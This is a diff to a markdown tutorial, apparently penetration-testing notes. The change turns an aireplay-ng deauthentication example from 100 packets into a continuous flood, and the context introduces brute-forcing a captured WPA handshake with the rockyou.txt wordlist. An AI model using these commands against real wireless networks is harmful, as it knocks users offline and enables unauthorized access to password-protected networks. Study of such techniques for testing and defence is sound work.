@@ -47,7 +47,7 @@ aireplay-ng --deauth <number_of_users> -a <bssid> <network_interface>
 ```
 Example:
 ```
-aireplay-ng --deauth 100 -a ff:ff:ff:ff:ff:ff wlan0
+aireplay-ng --deauth 0 -a ff:ff:ff:ff:ff:ff wlan0
 ```
 ## Bruteforce
 After capturing the handshake, we start brute-force the password using the dictionary. You can use `rockyou.txt` located in `/usr/share/wordlists/rockyou.txt`. If it is packed in an archive, that is, the file name is `rockyou.txt.gz`, then you need to unpack it with the command below.
